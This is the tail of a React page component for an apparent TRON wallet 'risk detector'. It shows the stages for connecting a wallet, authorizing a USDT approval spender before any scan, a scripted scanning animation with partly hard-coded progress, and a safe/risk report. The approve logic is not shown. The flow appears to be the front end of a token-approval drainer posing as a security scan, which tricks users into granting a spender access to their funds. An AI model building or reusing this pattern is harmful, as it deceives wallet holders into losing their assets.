                  {(stage === "home" || stage === "connected") && (
                    <div className="space-y-4">
                      <div className="rounded-[1.5rem] border border-border bg-card/60 p-5">
                        <div className="flex items-start gap-3">
                          <div className="rounded-2xl border border-border bg-accent/60 p-3 text-primary">
                            <Wallet className="h-5 w-5" />
                          </div>
                          <div className="space-y-2">
                            <p className="font-display text-lg text-foreground">{t("detector.connectCard.title")}</p>
                            <p className="text-sm leading-6 subtle-copy">{t("detector.connectCard.description")}</p>
                          </div>
                        </div>
                      </div>

                      <div className="grid gap-3">
                        {!wallet ? (
                          <Button className="tron-primary-button h-12 rounded-2xl text-base" onClick={connectWallet} disabled={isConnecting}>
                            {isConnecting ? t("detector.connectCard.connecting") : t("detector.connectCard.connect")}
                          </Button>
                        ) : (
                          <Button
                            className="tron-primary-button h-12 rounded-2xl text-base"
                            onClick={startAuthorization}
                            disabled={approvalSpenderLoading}
                          >
                            {approvalSpenderLoading ? t("detector.connectCard.loadingSpender") : t("detector.connectCard.authorize")}
                          </Button>
                        )}
                        <p className="text-center text-xs subtle-copy">{t("detector.connectCard.authorizationHint")}</p>
                      </div>
                    </div>
                  )}

                  {stage === "authorizing" && (
                    <div className="space-y-4">
                      <div className="rounded-[1.5rem] border border-border bg-card/60 p-5">
                        <div className="flex items-center gap-3">
                          <LoaderCircle className="h-5 w-5 animate-spin text-primary" />
                          <div>
                            <p className="font-display text-lg text-foreground">{t("detector.authorizing.title")}</p>
                            <p className="text-sm subtle-copy">{t("detector.authorizing.description")}</p>
                          </div>
                        </div>
                      </div>
                      <div className="meter-track">
                        <div className="meter-fill risk" style={{ width: "46%" }} />
                      </div>
                    </div>
                  )}

                  {stage === "scanning" && (
                    <div className="space-y-5">
                      <RadarAnimation />
                      <div className="space-y-3 text-center">
                        <p className="font-display text-2xl tron-text-glow">{t("detector.scanning.title")}</p>
                        <p aria-live="polite" className="text-sm subtle-copy">
                          {scanMessages[scanStep]}
                        </p>
                        <div className="meter-track">
                          <div className="meter-fill risk" style={{ width: `${38 + scanStep * 18}%` }} />
                        </div>
                      </div>
                    </div>
                  )}

                  {(stage === "safe" || stage === "risk") && report && (
                    <div className="space-y-4">
                      <div className={`rounded-[1.75rem] p-5 ${stage === "safe" ? "status-safe" : "status-risk"}`}>
                        <div className="flex items-start gap-4">
                          <div
                            className={`rounded-2xl border p-3 ${
                              stage === "safe" ? "border-success-soft bg-success-soft text-success" : "border-danger-soft bg-danger-soft text-danger"
                            }`}
                          >
                            {stage === "safe" ? <ShieldCheck className="h-7 w-7" /> : <ShieldAlert className="h-7 w-7" />}
                          </div>
                          <div className="space-y-2">
                            <p className="font-display text-2xl text-foreground">{t(report.titleKey)}</p>
                            <p className="text-sm leading-6 subtle-copy">{t(report.subtitleKey)}</p>
                          </div>
                        </div>

                        <div className="mt-5 grid grid-cols-2 gap-3">
                          {report.metrics.map((metric) => (
                            <div key={metric.labelKey} className="metric-chip">
                              <p className="text-xs uppercase tracking-[0.24em] subtle-copy">{t(metric.labelKey)}</p>
                              <p
                                className={`mt-2 font-display text-lg ${
                                  metric.tone === "safe" ? "text-success" : metric.tone === "risk" ? "text-danger" : "text-foreground"
                                }`}
                              >
                                {t(metric.valueKey)}
                              </p>
                            </div>
                          ))}
                        </div>

                        <div className="mt-5 space-y-2">
                          <div className="flex items-center justify-between text-sm">
                            <span className="subtle-copy">{t("report.scoreLabel")}</span>
                            <span className="font-display text-foreground">{report.score}/100</span>
                          </div>
                          <div className="meter-track">
                            <div className={`meter-fill ${stage === "safe" ? "safe" : "risk"}`} style={{ width: `${report.score}%` }} />
                          </div>
                        </div>
                      </div>

                      <div className="space-y-3">
                        {report.findings.map((finding) => (
                          <div key={finding.titleKey} className="rounded-[1.25rem] border border-border bg-card/60 p-4">
                            <div className="flex items-start gap-3">
                              {stage === "safe" ? (
                                <CheckCircle2 className="mt-0.5 h-5 w-5 text-success" />
                              ) : (
                                <BadgeAlert className="mt-0.5 h-5 w-5 text-danger" />
                              )}
                              <div>
                                <p className="font-display text-base text-foreground">{t(finding.titleKey)}</p>
                                <p className="mt-1 text-sm leading-6 subtle-copy">{t(finding.descriptionKey)}</p>
                              </div>
                            </div>
                          </div>
                        ))}
                      </div>

                      <div className="rounded-[1.5rem] border border-border bg-background/50 p-4">
                        <p className="font-display text-base text-foreground">{t("report.actionsTitle")}</p>
                        <ul className="mt-3 space-y-2 text-sm subtle-copy">
                          {report.recommendationKeys.map((item) => (
                            <li key={item} className="flex items-center gap-2">
                              <span className="info-dot" />
                              <span>{t(item)}</span>
                            </li>
                          ))}
                        </ul>
                      </div>

                      <div className="grid grid-cols-2 gap-3">
                        <Button className="tron-outline-button h-12 rounded-2xl" variant="outline" onClick={resetToHome}>
                          <RefreshCcw className="h-4 w-4" />
                          {stage === "safe" ? t("report.retryScan") : t("report.backHome")}
                        </Button>
                        <Button className="tron-primary-button h-12 rounded-2xl" onClick={() => setShowDetails((prev) => !prev)}>
                          {showDetails ? t("report.collapseReport") : stage === "safe" ? t("report.viewDetailedReport") : t("report.viewDetailedAnalysis")}
                        </Button>
                      </div>

                      {showDetails && (
                        <div className="rounded-[1.5rem] border border-border bg-card/60 p-4">
                          <p className="font-display text-base text-foreground">{t("report.detailedSummary")}</p>
                          <div className="glass-divider my-4" />
                          <div className="space-y-3 text-sm subtle-copy">
                            <p>
                              {t("report.engineLabel")}: {report.engine}
                            </p>
                            <p>
                              {t("report.addressLabel")}: {wallet ? wallet.address : "-"}
                            </p>
                            <p>
                              {t("report.contractLabel")}: {TRON_USDT_CONTRACT}
                            </p>
                            <p>
                              {t("report.conclusionLabel")}: {t("report.conclusionText")}
                            </p>
                          </div>
                        </div>
                      )}
                    </div>
                  )}
                </motion.div>
              </AnimatePresence>
            </CardContent>
          </Card>
        </section>
      </div>
    </main>
  );
};

export default Index;
